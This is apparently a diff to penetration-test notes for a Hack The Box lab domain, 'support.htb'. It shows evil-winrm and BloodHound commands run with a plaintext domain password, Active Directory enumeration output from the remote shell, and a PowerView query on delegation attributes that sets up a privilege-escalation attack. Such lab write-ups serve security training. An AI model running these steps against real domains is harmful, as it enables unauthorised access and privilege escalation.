@@ -125,3 +125,58 @@ evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
  bloodhound-python -u support -p 'Ironside47pleasure40Watchful' -d support.htb -ns 10.129.141.87 -c All
 
 ms-DS-MachineAccountQuota
+
+*Evil-WinRM* PS C:\Users\support\Documents> Get-ADDomain
+
+
+AllowedDNSSuffixes                 : {}
+ChildDomains                       : {}
+ComputersContainer                 : CN=Computers,DC=support,DC=htb
+DeletedObjectsContainer            : CN=Deleted Objects,DC=support,DC=htb
+DistinguishedName                  : DC=support,DC=htb
+DNSRoot                            : support.htb
+DomainControllersContainer         : OU=Domain Controllers,DC=support,DC=htb
+DomainMode                         : Windows2016Domain
+DomainSID                          : S-1-5-21-1677581083-3380853377-188903654
+ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=support,DC=htb
+Forest                             : support.htb
+InfrastructureMaster               : dc.support.htb
+LastLogonReplicationInterval       :
+LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=support,DC=htb}
+LostAndFoundContainer              : CN=LostAndFound,DC=support,DC=htb
+ManagedBy                          :
+Name                               : support
+NetBIOSName                        : SUPPORT
+ObjectClass                        : domainDNS
+ObjectGUID                         : 553cd9a3-86c4-4d64-9e85-5146a98c868e
+ParentDomain                       :
+PDCEmulator                        : dc.support.htb
+PublicKeyRequiredPasswordRolling   : True
+QuotasContainer                    : CN=NTDS Quotas,DC=support,DC=htb
+ReadOnlyReplicaDirectoryServers    : {}
+ReplicaDirectoryServers            : {dc.support.htb}
+RIDMaster                          : dc.support.htb
+SubordinateReferences              : {DC=ForestDnsZones,DC=support,DC=htb, DC=DomainDnsZones,DC=support,DC=htb, CN=Configuration,DC=support,DC=htb}
+SystemsContainer                   : CN=System,DC=support,DC=htb
+UsersContainer                     : CN=Users,DC=support,DC=htb
+
+*Evil-WinRM* PS C:\Users\support\Documents> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+SUPPORT\Shared Support Accounts            Group            S-1-5-21-1677581083-3380853377-188903654-1103 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+
+$RawBytes = Get-DomainComputer DC -Properties 'msds- allowedtoactonbehalfofotheridentity' | select -expand msds-
+allowedtoactonbehalfofotheridentity
